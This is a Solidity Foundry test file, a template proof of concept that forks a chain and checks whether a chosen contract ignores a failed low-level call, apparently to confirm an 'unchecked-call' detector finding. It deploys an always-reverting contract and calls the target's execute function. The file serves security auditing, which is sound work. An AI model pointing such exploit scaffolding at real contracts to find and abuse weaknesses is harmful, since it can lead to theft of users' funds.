// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import {Test, console} from "forge-std/Test.sol";

/// @title Fallback PoC -- Unchecked low-level call return
/// @notice Detector: unchecked-call / bytecode-unchecked-call. The target
///         does a low-level call and IGNORES whether it succeeded. If the
///         callee reverts, the target still records success -- funds, state,
///         or accounting diverge from reality.
/// @dev FORK-ONLY. Copy to foundry/test/Exploit.t.sol and run via
///      scripts/run-fork-poc.sh. TODO: adapt execute() to the target's
///      real function that makes the unchecked call.

contract Reverter {
    fallback() external payable {
        revert("callee reverts");
    }
}

contract PoC is Test {
    address public target;
    uint256 public forkBlock;

    function setUp() public {
        target = vm.envOr("POC_TARGET", address(0));
        require(target != address(0), "POC_TARGET not set");
        forkBlock = vm.envOr("POC_FORK_BLOCK", uint256(0));
        string memory rpc = vm.envOr("POC_RPC_URL", string("mainnet"));
        uint256 forkId = forkBlock == 0 ? vm.createFork(rpc) : vm.createFork(rpc, forkBlock);
        vm.selectFork(forkId);
    }

    function test_forkSanity() public {
        assertGt(target.code.length, 0, "target has no code at this fork block");
    }

    function test_exploit() public {
        Reverter reverter = new Reverter();

        // The target calls the reverter and (vulnerably) ignores the
        // failure, completing as if the call succeeded.
        // TODO: adapt to the target's real unchecked-call function.
        (bool ok,) = target.call(
            abi.encodeWithSignature("execute(address,bytes)", address(reverter), bytes(""))
        );
        require(ok, "execute(address,bytes) call failed -- adapt to the target's function");
        console.log("target completed despite callee reverting -- unchecked call proven");
        // A correct target bubbles the revert (or checks success), so the
        // outer call reverts and this test fails -- the right signal.
        assertTrue(ok, "exploit did not reproduce: target did not ignore the failed call");
    }
}
